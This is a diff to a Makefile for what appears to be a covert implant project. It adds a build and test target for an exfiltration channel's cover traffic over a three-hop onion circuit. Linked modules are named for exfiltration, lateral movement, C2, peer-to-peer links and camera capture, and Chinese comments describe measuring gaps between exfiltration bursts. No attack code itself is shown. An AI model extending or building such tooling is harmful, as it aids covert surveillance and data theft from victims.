@@ -26,7 +26,7 @@ LATLIB  := ../08_lateral/build/proxy.o ../08_lateral/build/lateral.o
 AGOBJS  := ../agent_windows/build/linux/cam_jpeg.o \
            ../agent_windows/build/linux/cam_mock.o
 
-all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit
+all: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/dump_cells $(BUILD)/dump_task $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_task_resume $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit
 
 $(BUILD):
 	mkdir -p $(BUILD)
@@ -168,7 +168,16 @@ $(BUILD)/test_cover_circuit: tests/test_cover_circuit.c $(BUILD)/cover_loop.o \
 	  $(BUILD)/task.o $(BUILD)/task_link.o $(BUILD)/exfil_link.o \
 	  $(BUILD)/exfil.o $(BUILD)/sched.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
 
-test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit
+# 产物回传通道（上行）的覆盖取证：真实 3 跳洋葱电路 + tee 旁路抓包。
+# 与 test_cover_circuit（任务通道/下行）互补——产物回传是周期性突发，
+# 核心指标是「批间静默 max_gap」而非「尾部静默」。
+$(BUILD)/test_exfil_cover_circuit: tests/test_exfil_cover_circuit.c \
+    $(BUILD)/link_cover.o $(BUILD)/exfil_link.o $(BUILD)/exfil.o \
+    $(P2PLIB) $(C2OBJS) $(LATLIB)
+	$(CC) $(CFLAGS) $< $(BUILD)/link_cover.o $(BUILD)/exfil_link.o \
+	  $(BUILD)/exfil.o -o $@ $(P2PLIB) $(C2OBJS) $(LATLIB)
+
+test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BUILD)/test_sched $(BUILD)/test_sched_gate $(BUILD)/test_task $(BUILD)/test_task_circuit $(BUILD)/test_link_cover $(BUILD)/test_task_cover $(BUILD)/test_cover_loop $(BUILD)/test_cover_circuit $(BUILD)/test_exfil_cover_circuit
 	./$(BUILD)/test_exfil
 	./$(BUILD)/test_cam_e2e
 	./$(BUILD)/test_exfil_circuit
@@ -179,6 +188,8 @@ test: $(BUILD)/test_exfil $(BUILD)/test_cam_e2e $(BUILD)/test_exfil_circuit $(BU
 	./$(BUILD)/test_link_cover
 	./$(BUILD)/test_task_cover
 	./$(BUILD)/test_cover_loop
+	./$(BUILD)/test_cover_circuit
+	./$(BUILD)/test_exfil_cover_circuit
 
 inspect: all
 	@echo "== 21_exfil 公开符号 =="
